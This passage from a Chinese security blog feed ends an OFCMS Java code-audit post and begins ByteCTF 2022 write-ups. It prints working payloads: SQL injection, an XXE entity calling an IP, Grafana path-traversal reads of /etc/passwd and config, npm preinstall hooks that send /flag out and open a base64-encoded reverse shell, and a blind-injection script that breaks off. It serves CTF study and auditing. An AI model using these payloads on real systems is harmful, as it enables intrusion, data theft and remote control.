class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Map</span> <span class="variable">params</span> <span class="operator">=</span> getParamsMap();</span><br><span class="line">            params.put(<span class="string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));</span><br><span class="line">            Db.update(Db.getSqlPara(<span class="string">&quot;cms.comment.save&quot;</span>, params));</span><br><span class="line">            rendSuccessJson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            rendFailedJson();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œè·å–è¯„è®ºå†…å®¹ä¹‹åï¼Œç›´æ¥æ›´æ–°çš„æ•°æ®åº“ï¼Œå°†è¯„è®ºå†…å®¹å­˜å…¥æ•°æ®åº“</p><p>å¯¹åº”çš„å‰ç«¯ä»£ç <code>ofcms-admin\src\main\webapp\WEB-INF\page\default\article.html</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018111429592.png" alt="image-20221018111429592"></p><h3 id="SQLæ³¨å…¥æ¼æ´"><a href="#SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQLæ³¨å…¥æ¼æ´"></a>SQLæ³¨å…¥æ¼æ´</h3><p>å¯¹åº”çš„åŠŸèƒ½  <code>ç³»ç»Ÿè®¾ç½®--&gt;ä»£ç ç”Ÿæˆ--&gt;å¢åŠ </code></p><p>burpæŠ“åŒ…ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨updateè¿›è¡Œsqlæ³¨å…¥</p><p>æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateController.java</code></p><p>å¯¹åº”äºcreate()å‡½æ•°</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152537326.png" alt="image-20221018152537326"></p><p>è·Ÿè¿›Db.update()å‡½æ•°</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152649536.png" alt="image-20221018152649536"></p><p>è·Ÿè¿›MAIN.update()å‡½æ•°</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018152716738.png" alt="image-20221018152716738"></p><p>è·Ÿè¿›updateå‡½æ•°</p><p>260è¡Œè¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œ261è¡Œè¿›è¡Œæ•°æ®åº“çš„æ›´æ–°æ“ä½œ</p><p>è°ƒç”¨é¡ºåºï¼Œupdateçš„äº’ç›¸è°ƒç”¨</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018153342634.png" alt="image-20221018153342634"></p><p>æ€»ä½“çš„è°ƒç”¨è¿‡ç¨‹å¤§æ¦‚å°±æ˜¯è¿™æ ·</p><p>ä»æ•°æ®åº“ä¸­æ‰¾ä¸ªè¡¨ï¼Œof_sys_userï¼Œç”¨æ¥æµ‹è¯•</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018154839190.png" alt="image-20221018154839190"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> of_sys_user <span class="keyword">set</span> login_name<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>) <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çˆ†å‡ºæ•°æ®åº“å</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018155004307.png" alt="image-20221018155004307"></p><h3 id="xxeæ¼æ´"><a href="#xxeæ¼æ´" class="headerlink" title="xxeæ¼æ´"></a>xxeæ¼æ´</h3><p>æ¼æ´å…¥å£å¤„ä½äº<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/ReprotAction.java</code>çš„expReport()å‡½æ•°ä¸­</p><p>å‡½æ•°å‰é¢ä¸»è¦æ˜¯é™åˆ¶æ–‡ä»¶çš„åç¼€ä¸ºjrxmlï¼Œä»¥åŠç”Ÿæˆæ–‡ä»¶è¾“å…¥æµï¼Œç¡®å®šæ–‡ä»¶ä½ç½®ç­‰ç­‰</p><p>è·Ÿè¿›JasperCompileManager.compileReportæ–¹æ³•</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162303618.png" alt="image-20221018162303618"></p><p>åˆ°è¾¾JasperCompileManager.classï¼Œè·Ÿè¿›compile</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162421235.png" alt="image-20221018162421235"></p><p>è·Ÿè¿›JRXmlLoader.loadå‡½æ•°</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162614018.png" alt="image-20221018162614018"></p><p>è·Ÿè¿›loadå‡½æ•°ï¼Œloadå‡½æ•°åˆè°ƒç”¨å¦ä¸€ä¸ªåŒåå‡½æ•°ï¼Œæœ€ç»ˆè°ƒç”¨xmlLoader.loadXML</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162736867.png" alt="image-20221018162736867"></p><p>è·Ÿè¿›xmlLoader.loadXMLï¼Œå…¶ä¸­<strong>è°ƒç”¨äº†Digesterç±»çš„parseè§£ææˆ‘ä»¬æ–‡ä»¶è¾“å…¥æµï¼Œä¹Ÿå°±æ˜¯xmlæ–‡æ¡£å†…å®¹ï¼Œå¹¶ä¸”é»˜è®¤æ²¡æœ‰ç¦ç”¨å¤–éƒ¨å®ä½“è§£æï¼Œæ‰€ä»¥å­˜åœ¨xxeæ¼æ´</strong></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018162839764.png" alt="image-20221018162839764"></p><h4 id="xxeæ¼æ´åˆ©ç”¨"><a href="#xxeæ¼æ´åˆ©ç”¨" class="headerlink" title="xxeæ¼æ´åˆ©ç”¨"></a>xxeæ¼æ´åˆ©ç”¨</h4><p>åˆ©ç”¨ä¹‹å‰çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ ä¸€ä¸ªxxe.jrxmlæ–‡ä»¶</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018163729204.png" alt="image-20221018163729204"></p><p>æ–‡ä»¶å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.74.177:7777&quot;</span>&gt;</span>%test; ]&gt;</span></span><br></pre></td></tr></table></figure><p>ç›‘å¬ç«¯å£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/ofcms_admin/admin/reprot/expReport.html?j=../../static/xxe</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018163700093.png" alt="image-20221018163700093"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ¬¡ç®—æ˜¯javacmsçš„å…¥é—¨å®¡è®¡ï¼Œè·Ÿç€å¤§ä½¬çš„åšå®¢è¿›è¡Œç¯å¢ƒæ­å»ºä¸ä»£ç å®¡è®¡åˆ†æï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ã€‚å› ä¸ºä¹‹å‰æœ‰phpçš„å®¡è®¡åŸºç¡€ï¼Œæ‰€ä»¥javaä¸Šæ‰‹è¿˜è¡Œï¼Œä¸ç®—æ…¢ã€‚</p><p>å¯¹freemarkeræ¨¡æ¿æ³¨å…¥ï¼ŒDigester.parseå¯¼è‡´çš„xxeæ¼æ´ï¼Œä»¥åŠä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆå’Œä¼ ç»Ÿçš„æ–‡ä»¶ä¸Šä¼ æœ‰äº›åŒºåˆ«ï¼‰éƒ½æœ‰äº†äº†è§£ä¸å®è·µã€‚</p><p>è¿™ä¸ªè¿‡ç¨‹ä¸­ä¹Ÿæ˜¯äº†è§£åˆ°äº†çœŸå®ç¯å¢ƒä¸‹æ¼æ´çš„æŒ–æ˜ä¸åˆ©ç”¨ï¼Œä¹‹åä¼šåˆ†ææ›´å¤šçš„javacmsï¼Œæé«˜è‡ªå·±çš„å®¡è®¡èƒ½åŠ›ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol><li><a href="https://blog.csdn.net/YouthBelief/article/details/122978328">(11æ¡æ¶ˆæ¯) ã€Javaä»£ç å®¡è®¡ã€‘OFCMS 1.1.3 å®¡è®¡_YouthBeliefçš„åšå®¢-CSDNåšå®¢_javacmsä»£ç å®¡è®¡</a></li><li><a href="https://blog.csdn.net/Alexz__/article/details/116426132">åˆè¯†javaä»£ç å®¡è®¡â€”â€”ofcms 1.1.4å†…å®¹ç®¡ç†ç³»ç»Ÿä»£ç å®¡è®¡_Alexz__çš„åšå®¢-CSDNåšå®¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Javaä»£ç å®¡è®¡,javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ofcms </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022bytectf</title>
      <link href="/2022/10/18/2022bytectf/"/>
      <url>/2022/10/18/2022bytectf/</url>
      
        <content type="html"><![CDATA[<h2 id="easy-groovy"><a href="#easy-groovy" class="headerlink" title="easy_groovy"></a>easy_groovy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String aa = new File(<span class="string">&quot;/flag&quot;</span>).text</span><br><span class="line">def res1 = new URL(<span class="string">&#x27;http://116.62.240.148:7077?a=&#x27;</span> + aa).text;</span><br></pre></td></tr></table></figure><h2 id="easy-grafana"><a href="#easy-grafana" class="headerlink" title="easy_grafana"></a>easy_grafana</h2><p>8.2.6çš„ç‰ˆæœ¬å¯¹åº”æœ‰ç›¸åº”çš„æ¼æ´</p><p><a href="https://cloud.tencent.com/developer/article/1973276">CVE-2021-43798ï¼šGrafanaä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/">Grafana æ–‡ä»¶è¯»å–æ¼æ´åˆ†æä¸æ±‡æ€»(CVE-2021-43798) - æ–—è±¡èƒ½åŠ›ä¸­å¿ƒ</a></p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122126822?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-122126822-blog-121794956.t5_download_0_7w&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-122126822-blog-121794956.t5_download_0_7w&utm_relevant_index=1">(1æ¡æ¶ˆæ¯) Grafanaä»»æ„æ–‡ä»¶è¯»å–æ¼æ´(CVE-2021-43798)å¤ç°_xzhomeçš„åšå®¢-CSDNåšå®¢_graphiteæ¼æ´</a></p><p>å—å½±å“çš„æ’ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertmanager/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/canvas/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashboard/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/debug/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/live/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mixed/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/xychart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-6.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /public/plugins/text/<span class="comment">#/../../../../../../../../../../etc/passwd HTTP/1.1</span></span><br><span class="line">Host: c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun</span><br><span class="line">Cookie: __t_id=9d390487baa727875304965b05e864f7; redirect_to=%2F</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Microsoft Edge&quot;</span>;v=<span class="string">&quot;105&quot;</span>, <span class="string">&quot; Not;A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;105&quot;</span></span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Origin: https://c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://c874aa39d7f9b70cfc97b964cee72ca5.2022.capturetheflag.fun/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-1.png" alt="img"></p><p>è¯»å–é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="keyword">public</span>/plugins/text/<span class="comment">#/../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1</span></span><br><span class="line">secret_key = SW2YcwTIb9zpO1hoPsMm</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-2.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">public</span>/plugins/text/<span class="comment">#/../../../../../../../../../../usr/share/grafana/conf/defaults.ini</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793597-3.png" alt="img"></p><p>å‘ç°ç™»å½•ä¸ä¸Šå»ï¼Œè¯»æ•°æ®åº“<code>/var/lib/grafana/grafana.db</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-4.png" alt="img"></p><p><a href="https://github.com/jas502n/Grafana-CVE-2021-43798">jas502n&#x2F;Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerability (github.com)</a></p><p>å¯¹passwordè¿›è¡ŒAESè§£å¯†å¾—flagï¼Œå¯†é’¥ç”¨ä¹‹å‰çš„secret_key</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1664202793598-5.png" alt="img"></p><h2 id="ctf-cloud"><a href="#ctf-cloud" class="headerlink" title="ctf_cloud"></a>ctf_cloud</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926213203175.png" alt="image-20220926213203175"></p><p>ç„¶åç”¨æˆ·adminï¼Œå¯†ç 1ç™»å½•</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926213214666.png" alt="image-20220926213214666"></p><p>æ–‡ä»¶ä¸Šä¼ </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sk1y&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bash -c &#x27;curl http://ip:7007/ -F --file=@/flag&#x27;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926220836591.png" alt="image-20220926220836591"></p><p>æ·»åŠ ä¾èµ–</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;sk1y&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:./public/uploads/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926215239212.png" alt="image-20220926215239212"></p><p>ç›‘å¬ç«¯å£ï¼Œç„¶åç‚¹å‡»ç¼–è¯‘</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926220643691.png" alt="image-20220926220643691"></p><p>æˆ–è€…åå¼¹shellï¼Œå°†ä¾èµ–è®¾ç½®ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;sk1y&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;preinstall&quot;</span>: <span class="string">&quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMjQwLjE0OC83MDA3IDA+JjE=|base64 -d|bash&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926221204453.png" alt="image-20220926221204453"></p><p>å†æˆ–è€…ä¸ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ ¹æ®WMæˆ˜é˜Ÿçš„wpï¼Œå°†package.jsonä¼ åˆ°githubå…¬å¼€åº“</p><p>å…ˆå¾€githubä»“åº“ä¸Šä¼ ä¸€ä¸ªpackage.jsonï¼Œç„¶åpostæäº¤ä¾èµ–</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926222037890.png" alt="image-20220926222037890"></p><p>ç„¶ååœ¨ç®¡ç†å‘˜ç”¨æˆ·ä¸‹ç¼–è¯‘</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926222445202.png" alt="image-20220926222445202"></p><h2 id="datamanager"><a href="#datamanager" class="headerlink" title="datamanager"></a>datamanager</h2><p>éšæ„æ³¨å†Œç„¶åç™»å½•ï¼Œ&#x2F;dashboard?order&#x3D;idå¤„å­˜åœ¨SQLæ³¨å…¥</p><p>è´´ä¸€ä¸‹wmå¸ˆå‚…ä»¬çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sre_constants <span class="keyword">import</span> SUCCESS</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests = requests.Session()</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#database() == datamanager</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tables : source,users</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#columns from users: current\\_connections,total\\_connections,user,id,n4me,pas$word</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#n4me from users: ctf,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pas$word from users: ctf@BvteDaNceS3cRet,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> 